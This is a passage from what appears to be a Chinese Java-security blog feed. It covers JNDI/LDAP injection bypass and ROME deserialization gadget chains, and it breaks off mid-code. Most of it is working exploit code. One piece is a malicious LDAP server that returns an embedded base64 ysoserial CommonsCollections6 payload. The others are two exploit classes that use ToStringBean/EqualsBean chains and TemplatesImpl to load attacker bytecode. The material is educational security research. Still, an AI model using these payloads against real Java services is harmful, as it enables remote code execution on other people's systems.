&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="高版本-2"><a class="markdownIt-Anchor" href="#高版本-2"></a> 高版本</h5><p>如果用反序列化，需要根据所选的链子加依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpExchange;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpHandler;<br><span class="hljs-keyword">import</span> com.sun.net.httpserver.HttpServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.text.ParseException;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServerByPass</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lanuchLDAPServer</span><span class="hljs-params">(Integer ldap_port, String http_server, Integer http_port)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    ldap_port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://&quot;</span>+http_server+<span class="hljs-string">&quot;:&quot;</span>+http_port+<span class="hljs-string">&quot;/#Calculator&quot;</span>)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + ldap_port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;calc&#x27;|base64</span><br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>,Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (ParseException e1) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String[] args1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;9090&quot;</span>, <span class="hljs-string">&quot;1099&quot;</span>&#125;;<br>        args = args1;<br>        System.out.println(<span class="hljs-string">&quot;HttpServerAddress: &quot;</span>+args[<span class="hljs-number">0</span>]);<br>        System.out.println(<span class="hljs-string">&quot;HttpServerPort: &quot;</span>+args[<span class="hljs-number">1</span>]);<br>        System.out.println(<span class="hljs-string">&quot;LDAPServerPort: &quot;</span>+args[<span class="hljs-number">2</span>]);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">http_server_ip</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ldap_port</span> <span class="hljs-operator">=</span> Integer.valueOf(args[<span class="hljs-number">2</span>]);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">http_server_port</span> <span class="hljs-operator">=</span> Integer.valueOf(args[<span class="hljs-number">1</span>]);<br><br>        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3><p><a href="https://xz.aliyun.com/t/12277?u_atoken=47def94559d313b6dec2ee5a681da7d6&amp;u_asig=1a0c384b17271798033023785e004a#toc-3">https://xz.aliyun.com/t/12277?u_atoken=47def94559d313b6dec2ee5a681da7d6&amp;u_asig=1a0c384b17271798033023785e004a#toc-3</a></p><p><a href="https://tttang.com/archive/1611/#toc_jndi-references">https://tttang.com/archive/1611/#toc_jndi-references</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html">https://www.cnblogs.com/bitterz/p/15946406.html</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROME反序列化</title>
    <link href="/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3><p>ROME是用来处理和操作XML格式的数据的工具，允许我们把XML数据转换成Java中的对象，也支持将Java对象转换成XML数据。</p><h4 id="依赖环境"><a class="markdownIt-Anchor" href="#依赖环境"></a> 依赖环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rome<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h3><img src="/2024/09/23/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" class=""><p><code>ToStringBean</code>的<code>toString</code>方法中<code>BeanIntrospector.getPropertyDescriptors</code>能够获取指定类的getter方法，并且参数可控，这很容易想到<code>TemplatesImpl</code>类的<code>getOutputProperties</code>这条链实现类加载。</p><p>所以接下来只需要找到调用toString的链子就可以了</p><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><h4 id="badattributevalueexpexception"><a class="markdownIt-Anchor" href="#badattributevalueexpexception"></a> BadAttributeValueExpException</h4><p>不受jdk限制</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">B<span class="hljs-function"><span class="hljs-title">adAttributeValueExpException</span>.readObject-&gt;</span>T<span class="hljs-function"><span class="hljs-title">oStringBean</span>.toString-&gt;</span>TemplatesImpl链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templatesimpl); <span class="hljs-comment">//要用Templates.class不能用TemplatesImpl.class</span><br><span class="hljs-comment">//        Method toStringMethod = toStringBean.getClass().getDeclaredMethod(&quot;toString&quot;, String.class);</span><br><span class="hljs-comment">//        toStringMethod.setAccessible(true);</span><br><span class="hljs-comment">//        toStringMethod.invoke(toStringBean, &quot;111&quot;);</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        SetFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,toStringBean);<br>        String s= serialize(badAttributeValueExpException);<br>        deserialize(s);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="equalsbean"><a class="markdownIt-Anchor" href="#equalsbean"></a> EqualsBean</h4><p>无jdk版本限制，目前这个payload是最短的</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash-&gt;</span>E<span class="hljs-function"><span class="hljs-title">qualsBean</span>.hashcode-&gt;</span>E<span class="hljs-function"><span class="hljs-title">qualsBean</span>.beanHashCode-&gt;</span>T<span class="hljs-function"><span class="hljs-title">oStringBean</span>.toString-&gt;</span>TemplatesImpl链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//要用Templates.class不能用TemplatesImpl.class,</span><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(equalsBean,<span 